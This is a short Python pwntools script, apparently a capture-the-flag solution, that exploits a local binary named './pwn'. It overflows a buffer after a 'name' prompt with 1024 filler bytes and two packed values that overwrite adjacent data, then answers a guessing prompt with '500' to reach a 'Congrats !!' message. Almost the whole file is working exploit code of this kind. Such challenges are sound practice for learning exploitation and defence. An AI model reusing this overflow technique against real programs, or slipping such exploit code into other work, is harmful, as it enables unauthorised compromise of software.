#!/usr/bin/env python2
from pwn import *

context(os = 'linux', arch = 'i386')
context.log_level = 'debug'
context.terminal = ['terminator', '-e']
context.terminal = 'terminator'
context.timeout = 1000

target      = {'host':'172.0.0.1', 'port':8080}

#==========

bin_file    = './pwn'
binf        = ELF(bin_file)

offset      = 1024

#==========

def attack(conn):
    info('start attack')
    conn.recvuntil('name')

    exploit      = 'A' * offset
    exploit     += p32(0xffffffff)
    exploit     += p32(0xffff)
    conn.sendline(exploit)
    print(conn.recvuntil('Guess'))
    conn.sendline('500')
    print(conn.recvuntil('Congrats !!'))
    info(conn.recvline())

#==========

if __name__ == '__main__':
    p = process(bin_file)
    #gdb.attach(p, '''
    #b *main+80
    #continue
    #''')
    attack(p)
    #p.interactive()
    p.close()

#==========
